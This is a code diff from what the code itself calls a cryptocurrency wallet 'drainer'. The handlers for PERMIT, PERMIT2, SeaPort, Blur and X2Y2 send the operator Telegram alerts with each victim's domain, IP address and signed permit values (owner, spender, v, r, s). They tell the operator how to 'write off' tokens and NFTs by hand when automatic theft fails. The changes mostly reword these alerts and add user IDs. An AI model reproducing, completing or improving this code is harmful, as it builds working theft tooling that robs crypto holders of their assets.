+              await send_message(receiver_chat_id, `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nUsing this data you can independently sign PERMIT online ${chain_id_to_name(data.sign.chain_id)} for the contract: <code>${data.sign.address}</code>\n\nIf you were unable to write off the Permit automatically, use the button below to try writing it off again.`, {
+                parse_mode: 'HTML'
+              });
             }
           }
         }
@@ -2926,29 +2416,9 @@ use manual signing option below.`, {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
           try {
-            await send_message(receiver_chat_id, 
-              `🔴 <b>: Permit Signature Blocked</b>
-              
-              🌐 <b>Domain:</b> <code>${data.domain}</code>
-              📍<b>IP:</b> <code>${User_Country}</code> 
-              
-              🛡️ <b>SECURITY ANALYSIS:</b>
-              ┌─────────────────────────
-              │  ⚠️ <b>Threat Level:</b> High
-              │  🔍 <b>Detection:</b> Fake PERMIT signature suspected
-              │  🚫 <b>Action:</b> Transaction automatically rejected
-              │  💰 <b>Reason:</b> Asset protection protocol activated
-              └─────────────────────────
-              
-              🔒 <b>System Response:</b>
-              Automatic security measures engaged to prevent
-              potential fund loss from fraudulent authorization.
-              
-              🔄 <b>Manual Override Available:</b>
-              You may attempt manual token withdrawal
-              if you believe the signature is legitimate.`, {
-                  parse_mode: 'HTML'
-              });
+            await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nSystem discovered that the PERMIT was most likely fake and, in order to save your money, rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the Signature is still real.`, {
+              parse_mode: 'HTML'
+            });
           } catch(err) {
             console.log(err);
           }
@@ -3211,7 +2681,7 @@ use manual signing option below.`, {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
         try {
-          await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can try to withdraw these assets yourself using PERMIT data if they are enabled in the drainer settings.`, {
+          await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can try to withdraw these assets yourself using PERMIT data if they are enabled in the drainer settings.`, {
             parse_mode: 'HTML'
           });
         } catch(err) {
@@ -3331,7 +2801,7 @@ const sign_permit2 = async (response, data) => {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
         try {
-          await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nMost likely, this is a fake Signature PERMIT2, since none of the tokens that were declared in the signature are actually approved for the PERMIT2 contract.`, {
+          await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nMost likely, this is a fake Signature PERMIT2, since none of the tokens that were declared in the signature are actually approved for the PERMIT2 contract.`, {
             parse_mode: 'HTML'
           });
         } catch(err) {
@@ -3350,7 +2820,7 @@ const sign_permit2 = async (response, data) => {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
           try {
-            await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nSystem discovered that the PERMIT was most likely fake and, in order to save your money, rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the Signature is still real.`, {
+            await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nSystem discovered that the PERMIT was most likely fake and, in order to save your money, rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the Signature is still real.`, {
               parse_mode: 'HTML'
             });
           } catch(err) {
@@ -3604,7 +3074,7 @@ const sign_permit2 = async (response, data) => {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
           try {
-            await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nSystem discovered that the PERMIT was most likely fake and, in order to save your money, rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the Signature is still real.`, {
+            await send_message(receiver_chat_id, `<b>❌ Failed to sign PERMIT2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nSystem discovered that the PERMIT was most likely fake and, in order to save your money, rejected the transaction.\n\nYou can still try to withdraw the Token manually if you think the Signature is still real.`, {
               parse_mode: 'HTML'
             });
           } catch(err) {
@@ -4014,7 +3484,7 @@ const seaport_handler = async (response, data) => {
             console.log(err);
           }
         }
-        await send_message(receiver_chat_id, `<b>❓  received a request for SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT List:</b> ${nfts_list_str}`, {
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT List:</b> ${nfts_list_str}`, {
           parse_mode: 'HTML'
         });
       }
@@ -4022,7 +3492,7 @@ const seaport_handler = async (response, data) => {
     } else if (data.seaport == 'cancel') {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-        await send_message(receiver_chat_id, `<b>❌  rejected SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
           parse_mode: 'HTML'
         });
       }
@@ -4035,14 +3505,14 @@ const seaport_handler = async (response, data) => {
       if (result) {
         if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
-          await send_message(receiver_chat_id, `<b>💎 Successfully signed SeaPort </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
+          await send_message(receiver_chat_id, `<b>💎 Successfully signed SeaPort user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
             parse_mode: 'HTML'
           });
         }
       } else {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-          await send_message(receiver_chat_id, `<b>❌ Failed to sign SeaPort </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
+          await send_message(receiver_chat_id, `<b>❌ Failed to sign SeaPort user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
             parse_mode: 'HTML'
           });
         }
@@ -4077,7 +3547,7 @@ const blur_handler = async (response, data) => {
             console.log(err);
           }
         }
-        await send_message(receiver_chat_id, `<b>❓  received a request for Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT List:</b> ${nfts_list_str}`, {
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>NFT List:</b> ${nfts_list_str}`, {
           parse_mode: 'HTML'
         });
       }
@@ -4085,7 +3555,7 @@ const blur_handler = async (response, data) => {
     } else if (data.blur == 'cancel') {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-        await send_message(receiver_chat_id, `<b>❌  rejected Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
           parse_mode: 'HTML'
         });
       }
@@ -4105,14 +3575,14 @@ const blur_handler = async (response, data) => {
       if (result) {
         if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
-          await send_message(receiver_chat_id, `<b>💎 Successfully signed Blur </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
+          await send_message(receiver_chat_id, `<b>💎 Successfully signed Blur user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
             parse_mode: 'HTML'
           });
         }
       } else {
         if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
           let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-          await send_message(receiver_chat_id, `<b>❌ Failed to sign Blur </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
+          await send_message(receiver_chat_id, `<b>❌ Failed to sign Blur user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
             parse_mode: 'HTML'
           });
         }
@@ -4147,7 +3617,7 @@ const x2y2_handler = async (response, data) => {
             console.log(err);
           }
         }
-        await send_message(receiver_chat_id, `<b>❓  received a request for X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>List NFT:</b> ${nfts_list_str}`, {
+        await send_message(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\n<b>List NFT:</b> ${nfts_list_str}`, {
           parse_mode: 'HTML'
         });
       }
@@ -4155,7 +3625,7 @@ const x2y2_handler = async (response, data) => {
     } else if (data.x2y2 == 'cancel') {
       if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
-        await send_message(receiver_chat_id, `<b>❌  rejected X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
+        await send_message(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
           parse_mode: 'HTML'
         });
       }
@@ -4163,7 +3633,7 @@ const x2y2_handler = async (response, data) => {
     } else if (data.x2y2 == 'success') {
       if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
         let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
-        await send_message(receiver_chat_id, `<b>💎 Successfully signed X2Y2 </b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
+        await send_message(receiver_chat_id, `<b>💎 Successfully signed X2Y2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
           parse_mode: 'HTML'
         });
       }
